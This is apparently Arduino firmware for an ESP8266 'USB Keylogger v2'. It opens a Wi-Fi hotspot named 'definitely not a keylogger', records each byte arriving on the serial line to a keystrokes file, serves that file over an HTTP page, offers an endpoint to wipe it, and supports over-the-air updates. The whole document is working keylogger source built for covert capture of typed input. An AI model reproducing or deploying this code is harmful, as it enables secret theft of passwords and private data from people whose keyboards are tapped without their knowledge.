#include <ESP8266WiFi.h>
#include <FS.h>
#include <ESP8266mDNS.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFSEditor.h>
#include <EEPROM.h>
#include <WiFiClient.h>
#include <AsyncElegantOTA.h>


#define BAUD_RATE 115200

/* ============= CHANGE WIFI CREDENTIALS ============= */
const char *ssid = "definitely not a keylogger";
const char *password = "password"; //min 8 chars
/* ============= ======================= ============= */

//ESP8266HTTPUpdateServer httpUpdater;
AsyncWebServer server(80);
//ESP8266WebServer server2 (8080);
FSInfo fs_info;
File f;


void setup() {
  
  Serial.begin(BAUD_RATE);

  Serial.println("\n\n\nUSB Keylogger v2\n\n");
  
  //Serial.println(WiFi.SSID());
  WiFi.mode(WIFI_STA);
  WiFi.softAP(ssid,password);
  
  EEPROM.begin(4096);
  SPIFFS.begin();

  //httpUpdater.setup(&server2, "/update", "admin", "admin");
  
  MDNS.addService("http","tcp",80);

  f = SPIFFS.open("/keystrokes.txt", "a+");
  if(!f) Serial.println("file open failed");

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/keystrokes.txt", "text/plain");
  });

  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request){
    f.close();
    f = SPIFFS.open("/keystrokes.txt", "w");
    request->send(200, "text/plain", "file cleared!");
  });

  AsyncElegantOTA.begin(&server);
  server.begin();
}

void loop() {
  AsyncElegantOTA.loop();
  if(Serial.available()) {
    f.write(Serial.read());
  }
  
}
